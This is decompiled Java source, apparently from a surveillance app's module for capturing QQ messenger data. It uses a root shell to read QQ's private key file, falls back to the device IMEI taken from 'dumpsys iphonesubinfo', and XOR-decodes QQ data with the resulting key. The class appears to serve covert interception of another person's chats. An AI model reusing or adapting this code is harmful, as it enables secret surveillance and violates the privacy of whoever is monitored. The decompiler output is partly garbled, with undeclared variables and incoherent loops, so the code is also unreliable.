package com.vvt.capture.qq;

import com.vvt.ak.a;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

class g
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private static char[] c;
  private static volatile int d;
  private static final Pattern e = Pattern.compile("[0-9]{15}");
  
  static
  {
    char[] arrayOfChar = new char[4];
    arrayOfChar[0] = 0;
    arrayOfChar[1] = 1;
    arrayOfChar[2] = 0;
    arrayOfChar[3] = 1;
    c = arrayOfChar;
  }
  
  static String a(String paramString, boolean paramBoolean)
  {
    return b(paramString, paramBoolean);
  }
  
  private static void a()
  {
    c = b().toCharArray();
    d = c.length;
  }
  
  static byte[] a(byte[] paramArrayOfByte)
  {
    if (paramArrayOfByte != null)
    {
      int i = d;
      if (i == 0) {
        a();
      }
      int j = paramArrayOfByte.length;
      byte[] arrayOfByte = new byte[j];
      int k = 0;
      while (k < j)
      {
        int m = paramArrayOfByte[k];
        char[] arrayOfChar = c;
        int n = d;
        n = k % n;
        int i1 = arrayOfChar[n];
        m = (byte)(m ^ i1);
        arrayOfByte[k] = m;
        k += 1;
      }
      paramArrayOfByte = arrayOfByte;
    }
    return paramArrayOfByte;
  }
  
  private static String b()
  {
    boolean bool1 = false;
    localf = null;
    String str1 = "";
    Object localObject2 = "/data/data/com.tencent.mobileqq/files/kc";
    for (;;)
    {
      try
      {
        bool2 = ShellUtil.b((String)localObject2);
        if (!bool2) {
          continue;
        }
        localObject2 = "cat %s";
        bool3 = true;
        localObject3 = new Object[bool3];
        String str2 = "/data/data/com.tencent.mobileqq/files/kc";
        localObject3[0] = str2;
        localObject2 = String.format((String)localObject2, (Object[])localObject3);
        str1 = KMShell.a((String)localObject2);
        bool2 = a;
        if (bool2) {}
        if (localf == null) {
          continue;
        }
      }
      catch (Exception localException)
      {
        boolean bool3;
        Object localObject3;
        boolean bool2 = b;
        if ((bool2) && (localf == null)) {
          continue;
        }
        continue;
      }
      finally
      {
        if (localf == null) {
          continue;
        }
        localf.d();
      }
      localf.d();
      bool1 = a;
      if (bool1) {}
      return str1;
      localf = f.b();
      bool2 = b;
      if (bool2) {}
      localObject2 = "dumpsys iphonesubinfo";
      localObject2 = localf.a((String)localObject2);
      localObject3 = e;
      localObject2 = ((Pattern)localObject3).matcher((CharSequence)localObject2);
      bool3 = ((Matcher)localObject2).find();
      if (bool3)
      {
        str1 = ((Matcher)localObject2).group();
        bool2 = a;
        if (!bool2) {}
      }
      else
      {
        bool2 = b;
        if (!bool2) {}
      }
    }
  }
  
  private static String b(String paramString, boolean paramBoolean)
  {
    int i = 0;
    int j = 0;
    char[] arrayOfChar1 = null;
    int k = d;
    if (k == 0) {
      a();
    }
    if (paramBoolean) {
      arrayOfChar1 = h.a(paramString);
    }
    if (arrayOfChar1 == null)
    {
      j = paramString.length();
      arrayOfChar1 = new char[j];
      paramBoolean = false;
    }
    for (;;)
    {
      k = paramString.length();
      if (i >= k) {
        break;
      }
      k = paramString.charAt(i);
      char[] arrayOfChar2 = c;
      int m = d;
      m = i % m;
      int n = arrayOfChar2[m];
      k = (char)(k ^ n);
      arrayOfChar1[i] = k;
      i += 1;
    }
    i = arrayOfChar1.length;
    if (i == 0) {
      paramString = "";
    }
    for (;;)
    {
      return paramString;
      if (!paramBoolean) {
        paramString = h.a(arrayOfChar1);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */